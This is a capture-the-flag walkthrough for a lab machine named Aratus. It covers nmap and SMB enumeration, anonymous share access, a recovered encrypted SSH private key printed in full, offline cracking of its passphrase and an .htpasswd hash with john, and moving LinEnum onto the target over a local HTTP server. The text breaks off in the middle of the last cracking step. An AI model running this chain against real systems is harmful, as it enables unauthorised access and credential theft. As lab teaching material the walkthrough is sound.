# Aratus


1. Enumerate with nmap, we see that ports 21 (ftp), 22 (ssh), 80/443 (http/https), and 139 (smb) are open
```
root@ip-10-10-35-64:~# sudo nmap -sS -A 10.10.89.114 -oN nmap.txt

Starting Nmap 7.60 ( https://nmap.org ) at 2022-03-27 06:00 BST
Nmap scan report for ip-10-10-89-114.eu-west-1.compute.internal (10.10.89.114)
Host is up (0.0014s latency).
Not shown: 994 filtered ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.2
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 0        0               6 Jun 09  2021 pub
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.35.64
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 09:23:62:a2:18:62:83:69:04:40:62:32:97:ff:3c:cd (RSA)
|   256 33:66:35:36:b0:68:06:32:c1:8a:f6:01:bc:43:38:ce (ECDSA)
|_  256 14:98:e3:84:70:55:e6:60:0c:c2:09:77:f8:b7:a6:1c (EdDSA)
80/tcp  open  http        Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips
|_http-title: Apache HTTP Server Test Page powered by CentOS
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp open  ssl/http    Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips
|_http-title: Apache HTTP Server Test Page powered by CentOS
| ssl-cert: Subject: commonName=aratus/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2021-11-23T12:28:26
|_Not valid after:  2022-11-23T12:28:26
|_ssl-date: TLS randomness does not represent time
445/tcp open  netbios-ssn Samba smbd 4.10.16 (workgroup: WORKGROUP)
MAC Address: 02:73:F1:FD:B7:5F (Unknown)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.13 (92%), Linux 3.8 (92%), Crestron XPanel control system (89%), HP P2000 G3 NAS device (86%), ASUS RT-N56U WAP (Linux 3.4) (86%), Linux 3.1 (86%), Linux 3.16 (86%), Linux 3.2 (86%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (86%), Linux 2.6.32 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: Host: ARATUS; OS: Unix

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.10.16)
|   Computer name: aratus
|   NetBIOS computer name: ARATUS\x00
|   Domain name: \x00
|   FQDN: aratus
|_  System time: 2022-03-27T07:00:34+02:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-03-27 06:00:36
|_  start_date: 1600-12-31 23:58:45

TRACEROUTE
HOP RTT     ADDRESS
1   1.36 ms ip-10-10-89-114.eu-west-1.compute.internal (10.10.89.114)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.98 seconds
```

2. Check for directories on the web server with gobuster. We find `cgi-bin/` but we don't have access to it
```
root@ip-10-10-35-64:~# gobuster dir -u http://10.10.89.114/ -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.89.114/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2022/03/27 06:18:42 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/cgi-bin/ (Status: 403)
===============================================================
2022/03/27 06:18:42 Finished
===============================================================
```

3. Login to ftp anonymously and find the directory `pub`, but there's nothing inside
```
root@ip-10-10-35-64:~# ftp 10.10.89.114
Connected to 10.10.89.114.
220 (vsFTPd 3.0.2)
Name (10.10.89.114:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0               6 Jun 09  2021 pub
226 Directory send OK.
ftp> cd pub
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
226 Directory send OK.
ftp> ls -al
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0               6 Jun 09  2021 .
drwxr-xr-x    3 0        0              17 Nov 23 09:56 ..
226 Directory send OK.
ftp> 
```

4. Use enum4linux to enumerate smb, we find the share `temporary share` and can login without any username and password. We also find users `theodore`, `automation`, and `simeon`
```
WARNING: polenum.py is not in your path.  Check that package is installed and your PATH is sane.
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Mar 27 05:51:49 2022

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.89.114
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==================================================== 
|    Enumerating Workgroup/Domain on 10.10.89.114    |
 ==================================================== 
[E] Can't find workgroup/domain


 ============================================ 
|    Nbtstat Information for 10.10.89.114    |
 ============================================ 
Looking up status of 10.10.89.114
No reply from 10.10.89.114

 ===================================== 
|    Session Check on 10.10.89.114    |
 ===================================== 
[+] Server 10.10.89.114 allows sessions using username '', password ''
[+] Got domain/workgroup name: 

 =========================================== 
|    Getting domain SID for 10.10.89.114    |
 =========================================== 
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ====================================== 
|    OS information on 10.10.89.114    |
 ====================================== 
[+] Got OS info for 10.10.89.114 from smbclient: 
[+] Got OS info for 10.10.89.114 from srvinfo:
	ARATUS         Wk Sv PrQ Unx NT SNT Samba 4.10.16
	platform_id     :	500
	os version      :	6.1
	server type     :	0x809a03

 ============================= 
|    Users on 10.10.89.114    |
 ============================= 


 ========================================= 
|    Share Enumeration on 10.10.89.114    |
 ========================================= 
WARNING: The "syslog" option is deprecated

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	temporary share Disk      
	IPC$            IPC       IPC Service (Samba 4.10.16)
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------

[+] Attempting to map shares on 10.10.89.114
//10.10.89.114/print$	Mapping: DENIED, Listing: N/A
//10.10.89.114/temporary share	Mapping: OK, Listing: OK
//10.10.89.114/IPC$	[E] Can't understand response:
WARNING: The "syslog" option is deprecated
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

 ==================================================== 
|    Password Policy Information for 10.10.89.114    |
 ==================================================== 
[E] Dependent program "polenum.py" not present.  Skipping this check.  Download polenum from http://labs.portcullis.co.uk/application/polenum/


 ============================== 
|    Groups on 10.10.89.114    |
 ============================== 

[+] Getting builtin groups:

[+] Getting builtin group memberships:

[+] Getting local groups:

[+] Getting local group memberships:

[+] Getting domain groups:

[+] Getting domain group memberships:

 ======================================================================= 
|    Users on 10.10.89.114 via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================= 
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-1257186002-520694900-3094463090
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-5-21-1257186002-520694900-3094463090 and logon username '', password ''
S-1-5-21-1257186002-520694900-3094463090-500 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-501 ARATUS\nobody (Local User)
S-1-5-21-1257186002-520694900-3094463090-502 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-503 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-504 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-505 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-506 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-507 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-508 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-509 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-510 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-511 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-512 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-513 ARATUS\None (Domain Group)
S-1-5-21-1257186002-520694900-3094463090-514 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-515 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-516 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-517 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-518 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-519 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-520 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-521 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-522 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-523 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-524 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-525 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-526 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-527 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-528 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-529 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-530 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-531 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-532 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-533 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-534 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-535 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-536 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-537 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-538 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-539 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-540 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-541 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-542 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-543 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-544 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-545 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-546 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-547 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-548 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-549 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-550 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-1000 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-1001 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-1002 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-1003 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-1004 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-1005 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-1006 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-1007 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-1008 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-1009 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-1010 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-1011 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-1012 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-1013 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-1014 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-1015 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-1016 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-1017 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-1018 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-1019 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-1020 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-1021 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-1022 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-1023 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-1024 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-1025 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-1026 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-1027 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-1028 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-1029 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-1030 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-1031 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-1032 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-1033 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-1034 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-1035 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-1036 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-1037 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-1038 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-1039 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-1040 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-1041 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-1042 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-1043 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-1044 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-1045 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-1046 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-1047 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-1048 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-1049 *unknown*\*unknown* (8)
S-1-5-21-1257186002-520694900-3094463090-1050 *unknown*\*unknown* (8)
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1001 Unix User\theodore (Local User)
S-1-22-1-1002 Unix User\automation (Local User)
S-1-22-1-1003 Unix User\simeon (Local User)
[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
S-1-5-32-500 *unknown*\*unknown* (8)
S-1-5-32-501 *unknown*\*unknown* (8)
S-1-5-32-502 *unknown*\*unknown* (8)
S-1-5-32-503 *unknown*\*unknown* (8)
S-1-5-32-504 *unknown*\*unknown* (8)
S-1-5-32-505 *unknown*\*unknown* (8)
S-1-5-32-506 *unknown*\*unknown* (8)
S-1-5-32-507 *unknown*\*unknown* (8)
S-1-5-32-508 *unknown*\*unknown* (8)
S-1-5-32-509 *unknown*\*unknown* (8)
S-1-5-32-510 *unknown*\*unknown* (8)
S-1-5-32-511 *unknown*\*unknown* (8)
S-1-5-32-512 *unknown*\*unknown* (8)
S-1-5-32-513 *unknown*\*unknown* (8)
S-1-5-32-514 *unknown*\*unknown* (8)
S-1-5-32-515 *unknown*\*unknown* (8)
S-1-5-32-516 *unknown*\*unknown* (8)
S-1-5-32-517 *unknown*\*unknown* (8)
S-1-5-32-518 *unknown*\*unknown* (8)
S-1-5-32-519 *unknown*\*unknown* (8)
S-1-5-32-520 *unknown*\*unknown* (8)
S-1-5-32-521 *unknown*\*unknown* (8)
S-1-5-32-522 *unknown*\*unknown* (8)
S-1-5-32-523 *unknown*\*unknown* (8)
S-1-5-32-524 *unknown*\*unknown* (8)
S-1-5-32-525 *unknown*\*unknown* (8)
S-1-5-32-526 *unknown*\*unknown* (8)
S-1-5-32-527 *unknown*\*unknown* (8)
S-1-5-32-528 *unknown*\*unknown* (8)
S-1-5-32-529 *unknown*\*unknown* (8)
S-1-5-32-530 *unknown*\*unknown* (8)
S-1-5-32-531 *unknown*\*unknown* (8)
S-1-5-32-532 *unknown*\*unknown* (8)
S-1-5-32-533 *unknown*\*unknown* (8)
S-1-5-32-534 *unknown*\*unknown* (8)
S-1-5-32-535 *unknown*\*unknown* (8)
S-1-5-32-536 *unknown*\*unknown* (8)
S-1-5-32-537 *unknown*\*unknown* (8)
S-1-5-32-538 *unknown*\*unknown* (8)
S-1-5-32-539 *unknown*\*unknown* (8)
S-1-5-32-540 *unknown*\*unknown* (8)
S-1-5-32-541 *unknown*\*unknown* (8)
S-1-5-32-542 *unknown*\*unknown* (8)
S-1-5-32-543 *unknown*\*unknown* (8)
S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)
S-1-5-32-1000 *unknown*\*unknown* (8)
S-1-5-32-1001 *unknown*\*unknown* (8)
S-1-5-32-1002 *unknown*\*unknown* (8)
S-1-5-32-1003 *unknown*\*unknown* (8)
S-1-5-32-1004 *unknown*\*unknown* (8)
S-1-5-32-1005 *unknown*\*unknown* (8)
S-1-5-32-1006 *unknown*\*unknown* (8)
S-1-5-32-1007 *unknown*\*unknown* (8)
S-1-5-32-1008 *unknown*\*unknown* (8)
S-1-5-32-1009 *unknown*\*unknown* (8)
S-1-5-32-1010 *unknown*\*unknown* (8)
S-1-5-32-1011 *unknown*\*unknown* (8)
S-1-5-32-1012 *unknown*\*unknown* (8)
S-1-5-32-1013 *unknown*\*unknown* (8)
S-1-5-32-1014 *unknown*\*unknown* (8)
S-1-5-32-1015 *unknown*\*unknown* (8)
S-1-5-32-1016 *unknown*\*unknown* (8)
S-1-5-32-1017 *unknown*\*unknown* (8)
S-1-5-32-1018 *unknown*\*unknown* (8)
S-1-5-32-1019 *unknown*\*unknown* (8)
S-1-5-32-1020 *unknown*\*unknown* (8)
S-1-5-32-1021 *unknown*\*unknown* (8)
S-1-5-32-1022 *unknown*\*unknown* (8)
S-1-5-32-1023 *unknown*\*unknown* (8)
S-1-5-32-1024 *unknown*\*unknown* (8)
S-1-5-32-1025 *unknown*\*unknown* (8)
S-1-5-32-1026 *unknown*\*unknown* (8)
S-1-5-32-1027 *unknown*\*unknown* (8)
S-1-5-32-1028 *unknown*\*unknown* (8)
S-1-5-32-1029 *unknown*\*unknown* (8)
S-1-5-32-1030 *unknown*\*unknown* (8)
S-1-5-32-1031 *unknown*\*unknown* (8)
S-1-5-32-1032 *unknown*\*unknown* (8)
S-1-5-32-1033 *unknown*\*unknown* (8)
S-1-5-32-1034 *unknown*\*unknown* (8)
S-1-5-32-1035 *unknown*\*unknown* (8)
S-1-5-32-1036 *unknown*\*unknown* (8)
S-1-5-32-1037 *unknown*\*unknown* (8)
S-1-5-32-1038 *unknown*\*unknown* (8)
S-1-5-32-1039 *unknown*\*unknown* (8)
S-1-5-32-1040 *unknown*\*unknown* (8)
S-1-5-32-1041 *unknown*\*unknown* (8)
S-1-5-32-1042 *unknown*\*unknown* (8)
S-1-5-32-1043 *unknown*\*unknown* (8)
S-1-5-32-1044 *unknown*\*unknown* (8)
S-1-5-32-1045 *unknown*\*unknown* (8)
S-1-5-32-1046 *unknown*\*unknown* (8)
S-1-5-32-1047 *unknown*\*unknown* (8)
S-1-5-32-1048 *unknown*\*unknown* (8)
S-1-5-32-1049 *unknown*\*unknown* (8)
S-1-5-32-1050 *unknown*\*unknown* (8)

 ============================================= 
|    Getting printer info for 10.10.89.114    |
 ============================================= 
No printers returned.


enum4linux complete on Sun Mar 27 05:52:28 2022
```

4. Use smbclient to login to smb `smbclient \\\\10.10.89.114\\"temporary share"\\`. We find a lot of text files, as well as `.bash_history`, `.bashrc`, `.ssh/`, `.viminfo`, and `message-to-simeon.txt`
```
root@ip-10-10-35-64:~# smbclient \\\\10.10.89.114\\"temporary share"\\
WARNING: The "syslog" option is deprecated
Enter WORKGROUP\root's password: 
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jan 10 13:06:44 2022
  ..                                  D        0  Tue Nov 23 16:24:05 2021
  .bash_logout                        H       18  Wed Apr  1 03:17:30 2020
  .bash_profile                       H      193  Wed Apr  1 03:17:30 2020
  .bashrc                             H      231  Wed Apr  1 03:17:30 2020
  .bash_history                       H        0  Sun Mar 27 05:19:30 2022
  chapter1                            D        0  Tue Nov 23 10:07:47 2021
  chapter2                            D        0  Tue Nov 23 10:08:11 2021
  chapter3                            D        0  Tue Nov 23 10:08:18 2021
  chapter4                            D        0  Tue Nov 23 10:08:25 2021
  chapter5                            D        0  Tue Nov 23 10:08:33 2021
  chapter6                            D        0  Tue Nov 23 10:12:24 2021
  chapter7                            D        0  Tue Nov 23 11:14:27 2021
  chapter8                            D        0  Tue Nov 23 10:12:45 2021
  chapter9                            D        0  Tue Nov 23 10:12:53 2021
  .ssh                               DH        0  Mon Jan 10 13:05:34 2022
  .viminfo                            H        0  Sun Mar 27 05:19:30 2022
  message-to-simeon.txt               N      251  Mon Jan 10 13:06:44 2022

		37726212 blocks of size 1024. 35598076 blocks available
smb: \> pwd
Current directory is \\10.10.89.114\temporary share\
```

5. Let's start with `message-to-simeon.txt`. Use `get message-to-simeon.txt` to download it
```
Simeon,

Stop messing with your home directory, you are moving files and directories insecurely!
Just make a folder in /opt for your book project...

Also you password is insecure, could you please change it? It is all over the place now!

- Theodore
```

6. Check the hidden files, and they all either have no information or we don't have perms to see them. Let's download all the chapters using this set of commands
```
smbclient '\\server\share'
mask ""
recurse ON
prompt OFF
cd 'path\to\remote\dir'
lcd '~/path/to/download/to/'
mget *
```

7. At first I tried looking for differences in the files of each chapter with `diff`, but it was going to take a long time so I just tried `grep -r <keyword> .` to see if words or characters popped up on any of the text files. I first used `grep -r ssh .` but found nothing. When I used `grep -r : .` (: is used to separate usernames and passwords combos in many cases) I ran into a private ssh key in chapter 7
```
$ grep -r : .    
./chapter7/paragraph7.1/text2.txt:Proc-Type: 4,ENCRYPTED
./chapter7/paragraph7.1/text2.txt:DEK-Info: AES-128-CBC,596088D0C0C3E6F997CF39C431816A88
```
```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,596088D0C0C3E6F997CF39C431816A88

5t3gTvBBx3f871Au/57hicjw646uQzz+SOfHtmUGL8IvojzDAgC72IX20qg717Dl
xD+jjENQUEB60dsEbPtzc9BatTZX6kQ9B0DXVEY63v/8wHb4Aq6g5WwgGNH6Nq6y
hIpylfVflBTnYpdSSIHnTdqzgzzHuOotLGoQJOrwO8IvmdlId7/dqpLgCY6jQMB8
nYYbkwwcyXcyt7ouZNfb3/eIp6afHW8g9cC2M9HIYLAtEIejxmcCqF2XjYIekZ/L
TI5EVrPOnLZeT5N6byAtODlIPJyJRE3gIiS1tTPxxOjBl6/7lEDQ49eIz5mCHxOz
BrIfgjaTRTPC1G6b+QAS9S1dleqNE4j5+FUsYpJDLan+WCgGc6oFgBjTTz96UB7M
qduRY8O+bW36OJhQh3hCxfZevCSa5ug6hH+q43XP0O9UkUL8U4/1dFLa4RI9cjIK
D3ythFCQUzT4RKMoW+F1528Fhro0lPRgc6XfhJu/zs3gr6yIiaolIE+YVOB92IBx
Xu6kBRLPct6Gj7lFSnISYa+Vu5UyQNUNP+Ezk9GgeK/PGwMd2sfLW79PKyhl4iXZ
ymkbHWAfgHk+kmY/+EPgdgf9VyglYOjx5hBopEpPlfuZb/X/PZTO8CYxltYHiJtn
FCjnVV9rH6oUBgaA2yspo22OEi8QdSoGzUrz9TgdStxls20vTuYuwll8rhyZu7OR
ehXskDrvxAnptNzHyLjj800W4/X7jUltuA3jfvEYLGFeLyeP3Cg/IFnXbv+4H3ca
TxTnFUNY9t8DsnYiaHgbKTx7XpVwGATI+Wn3cT558xIvPhipge2lso5d0KTLP2Nn
kLlwlcSQp393GvUlJ7e9Gd1KkoZvk6wxjWB0ZxOSte/HJJooXfNF7/8p3v9Y++iX
NVNA/vu4o8C8TfKgq91cm+j13s/WNV1g8TXqbI9TU/YW4ZEEeemJFA0hd0eQvZvR
C4z/qJZH8MhBB6VIVn4l0uhNKHehaZCoGUtR28IzIctz96CJnwl3DbMKWX8c7mx0
s+1rJAjjcKxFS7lxPiCID6j/hZvsdjXnPScH2e/lQ1bMUk2rOCsDKCKeY0YGCkvI
H51/oW3qCjUx7Rtnf8RKu16uMDMBqDFYc795QoFmz9SAe7tCHmtKyZw1rI8x4G2I
rzptsqT3tW+hMrlqBM8wxksKfnhQE8h06tJKSusv12BabgkCNuk9CuD9D7yfgURI
hKXIf7SYorLBo7aBDXxwPZzanqNPsicL03Pbcv6LK18nubBd4nN9yLJB7ew0Q2WC
d19y9APjMKqoOUkXFtVhUFH5RQH7cDzoK1MZEZzMG7DKs496ZkDXxNJP6t5LiGmi
LIGlrXjAbf/+4/2+GNmVUZ+7xXhtM08hj+U5W0StmD7UGa/kVbwsdgBoUztz91wC
byotvP69b/oQBbzs/ZZSKJlAu2OhNGgN1El4/jhCHWcs5+1R1tVcAbZugdvPH2qK
rTePu5Dh58RV3mdmw7IyxdRzD95mp7FOnw6k+a7tZpghYLnzHH6Xrpor28XZilLT
aWtaV/4FhBPopJrwjq5l67jIYXILd+p6AXTZMhJp0QA53unDH8OSSAxc1YvmoAOV
-----END RSA PRIVATE KEY-----
```

8. Copy the private key into a file called `id_rsa`, change its permissions with `chmod 600 id_rsa`, and then try to ssh with `ssh -i id_rsa simeon@<ip address>`. We find that the key is protected with a passphrase. We can crack it by using [ssh2john](https://github.com/openwall/john/blob/bleeding-jumbo/run/ssh2john.py) with `python3 ssh2john.py id_rsa > hash`, then crack the hash with `john --wordlist=/usr/share/wordlists/rockyou.txt hash` to find the passphrase `testing123`. Now we can ssh into the machine as simeon successfully
```
└─$ python3 ssh2john.py id_rsa > hash
                                                                                                                                                                                                              
┌──(kali㉿kali)-[/tmp]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash                                                                                                                                                 1 ⨯
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
testing123       (id_rsa)     
1g 0:00:00:00 DONE (2022-03-27 14:09) 33.33g/s 2249Kp/s 2249Kc/s 2249KC/s tina23..tennis08
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

9. After looking around, we see that we don't have the perms to see any of the other users' home folders in `/home`, and we can't see any of the folders in `/opt` (where theodore told simeon to store files), `/ansible` and `scripts`. Let's run an enumeration script. First, cd to `/tmp` (we don't want to leave any traces) and try to `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`. This doesn't work, so let's just download it onto our attacking machine, create a http server with `python3 -m http.server`, and then download it onto the victim from there

10. Run the script and we find a hash in `.htpasswd`, this time for theodore. Crack it with john to find that theodore's password is also `testing123`
```
/var/www/html/test-auth/.htpasswd
theodore:$apr1$pP2GhAkC$R12mw5B5lxUiaNj4Qt2pX1
```
```
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
Will run 4 OpenMP threads
